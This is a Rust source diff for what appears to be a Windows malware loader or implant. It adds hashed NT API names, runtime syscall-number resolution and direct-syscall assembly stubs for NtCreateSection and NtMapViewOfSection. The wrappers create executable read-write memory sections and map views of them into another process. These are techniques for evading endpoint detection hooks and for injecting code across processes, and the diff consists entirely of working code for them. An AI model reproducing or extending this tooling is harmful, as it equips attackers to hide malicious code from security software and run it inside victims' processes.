@@ -141,6 +141,8 @@ pub const HASH_NT_SUSPEND_THREAD: u32 = fnv1a(b"NtSuspendThread");
 pub const HASH_NT_CREATE_USER_PROCESS: u32 = fnv1a(b"NtCreateUserProcess");
 pub const HASH_NT_QUERY_INFORMATION_PROCESS: u32 = fnv1a(b"NtQueryInformationProcess");
 pub const HASH_NT_CLOSE: u32 = fnv1a(b"NtClose");
+pub const HASH_NT_CREATE_SECTION: u32 = fnv1a(b"NtCreateSection");
+pub const HASH_NT_MAP_VIEW_OF_SECTION: u32 = fnv1a(b"NtMapViewOfSection");
 
 pub static mut SSN_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0;
 pub static mut SSN_NT_FREE_VIRTUAL_MEMORY: u32 = 0;
@@ -157,6 +159,10 @@ pub static mut SSN_NT_SUSPEND_THREAD: u32 = 0;
 pub static mut SSN_NT_CREATE_USER_PROCESS: u32 = 0;
 pub static mut SSN_NT_QUERY_INFORMATION_PROCESS: u32 = 0;
 pub static mut SSN_NT_CLOSE: u32 = 0;
+#[no_mangle]
+pub static mut SSN_NT_CREATE_SECTION: u32 = 0;
+#[no_mangle]
+pub static mut SSN_NT_MAP_VIEW_OF_SECTION: u32 = 0;
 
 /// NtQueryInformationProcess(ProcessBasicInformation) result — ProcessBasicInformation (class 0).
 /// Layout is stable across all NT 6.x+ versions.
@@ -281,6 +287,8 @@ pub fn init() -> bool {
         resolve!(HASH_NT_CREATE_USER_PROCESS,         SSN_NT_CREATE_USER_PROCESS);
         resolve!(HASH_NT_QUERY_INFORMATION_PROCESS,   SSN_NT_QUERY_INFORMATION_PROCESS);
         resolve!(HASH_NT_CLOSE,                       SSN_NT_CLOSE);
+        resolve!(HASH_NT_CREATE_SECTION,              SSN_NT_CREATE_SECTION);
+        resolve!(HASH_NT_MAP_VIEW_OF_SECTION,         SSN_NT_MAP_VIEW_OF_SECTION);
     }
     true
 }
@@ -419,6 +427,22 @@ global_asm!(
     "ret",
 );
 
+// NtCreateSection (7 args) and NtMapViewOfSection (10 args) use the same pattern.
+// Caller supplies all args per Windows x64 ABI; shim sets r10=rcx and reads SSN
+// from the resolved static.
+global_asm!(
+    "dm_create_section:",
+    "mov r10, rcx",
+    "mov eax, DWORD PTR [rip + SSN_NT_CREATE_SECTION]",
+    "syscall",
+    "ret",
+    "dm_map_view_of_section:",
+    "mov r10, rcx",
+    "mov eax, DWORD PTR [rip + SSN_NT_MAP_VIEW_OF_SECTION]",
+    "syscall",
+    "ret",
+);
+
 extern "C" {
     pub fn dm_syscall(ssn: u32, a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) -> i32;
 
@@ -438,6 +462,31 @@ extern "C" {
         stack_size: usize,          // [rsp+0x48]
         maximum_stack_size: usize,  // [rsp+0x50]
         attribute_list: *mut u8,    // [rsp+0x58]
+    ) -> i32;
+
+    // NtCreateSection: 7 NT args in Windows x64 ABI layout.
+    pub fn dm_create_section(
+        section_handle:        *mut isize, // rcx
+        desired_access:        u32,        // rdx
+        object_attributes:     *mut u8,    // r8  (NULL = unnamed)
+        maximum_size:          *mut i64,   // r9
+        section_page_protect:  u32,        // [rsp+0x28]
+        allocation_attributes: u32,        // [rsp+0x30]
+        file_handle:           isize,      // [rsp+0x38]  (0 = pagefile-backed)
+    ) -> i32;
+
+    // NtMapViewOfSection: 10 NT args in Windows x64 ABI layout.
+    pub fn dm_map_view_of_section(
+        section_handle:       isize,          // rcx
+        process_handle:       isize,          // rdx
+        base_address:         *mut *mut u8,   // r8
+        zero_bits:            usize,          // r9
+        commit_size:          usize,          // [rsp+0x28]
+        section_offset:       *mut i64,       // [rsp+0x30]  (NULL = from start)
+        view_size:            *mut usize,     // [rsp+0x38]
+        inherit_disposition:  u32,            // [rsp+0x40]  (2 = ViewUnmap)
+        allocation_type:      u32,            // [rsp+0x48]
+        win32_protect:        u32,            // [rsp+0x50]
     ) -> i32;
 }
 
@@ -648,4 +697,48 @@ pub unsafe fn nt_query_information_process(
 
 pub unsafe fn nt_close(handle: isize) -> i32 {
     dm_syscall(SSN_NT_CLOSE, handle as u64, 0, 0, 0, 0, 0)
+}
+
+/// NtCreateSection — pagefile-backed anonymous section (no file handle).
+/// page_prot: PAGE_EXECUTE_READWRITE (0x40).
+/// alloc_attrs: SEC_COMMIT (0x08000000).
+pub unsafe fn nt_create_section(
+    handle:      *mut isize,
+    access:      u32,
+    max_size:    *mut i64,
+    page_prot:   u32,
+    alloc_attrs: u32,
+) -> i32 {
+    dm_create_section(
+        handle,
+        access,
+        core::ptr::null_mut(),
+        max_size,
+        page_prot,
+        alloc_attrs,
+        0,
+    )
+}
+
+/// NtMapViewOfSection — map a view of `section` into `process`.
+/// protect: desired page protection for this view (PAGE_READWRITE, PAGE_EXECUTE_READ, etc.).
+pub unsafe fn nt_map_view(
+    section:   isize,
+    process:   isize,
+    base:      *mut *mut u8,
+    view_size: *mut usize,
+    protect:   u32,
+) -> i32 {
+    dm_map_view_of_section(
+        section,
+        process,
+        base,
+        0,                          // zero_bits
+        0,                          // commit_size (map all)
+        core::ptr::null_mut(),      // section_offset (from start)
+        view_size,
+        2,                          // ViewUnmap
+        0,                          // allocation_type
+        protect,
+    )
 }
